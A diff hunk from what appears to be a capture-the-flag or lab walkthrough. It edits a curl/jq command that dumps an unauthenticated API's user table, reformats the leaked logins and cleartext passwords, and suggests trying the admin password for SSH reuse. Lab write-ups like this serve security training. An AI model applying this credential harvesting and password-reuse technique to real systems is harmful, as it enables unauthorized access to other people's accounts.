@@ -71,18 +71,18 @@ A `/user/` endpoint on an unauthenticated API is a giant flashing sign.
 The `/api/user/` endpoint happily returns the full user table — logins **and cleartext passwords**:
 
 ```bash
-curl http://192.168.142.125:8080/api/user/ | jq . | grep 'login\|password\|description'
+curl http://192.168.142.125:8080/api/user/ | jq -c '.[] | {login, password, description}'
 ```
 
 ```
-"login": "rjackson",  "password": "yYJcgYqszv4aGQ",       "description": "Editor"
-"login": "jsanchez",  "password": "d52cQ1BzyNQycg",       "description": "Editor"
-"login": "dademola",  "password": "ExplainSlowQuest110",  "description": "Admin"
-"login": "jwinters",  "password": "KTuGcSW6Zxwd0Q",       "description": "Editor"
-"login": "jvargas",   "password": "OuQ96hcgiM5o9w",       "description": "Editor"
+{"login":"rjackson","password":"yYJcgYqszv4aGQ","description":"Editor"}
+{"login":"jsanchez","password":"d52cQ1BzyNQycg","description":"Editor"}
+{"login":"dademola","password":"ExplainSlowQuest110","description":"Admin"}
+{"login":"jwinters","password":"KTuGcSW6Zxwd0Q","description":"Editor"}
+{"login":"jvargas","password":"OuQ96hcgiM5o9w","description":"Editor"}
 ```
 
-The `dademola` account is flagged `Admin`. Since SSH lives on 43022, try password reuse there first — admin creds go first:
+The `dademola` account is flagged `Admin`. Since SSH lives on 43022, try password reuse there — admin creds go first:
 
 ```bash
 ssh dademola@192.168.142.125 -p 43022
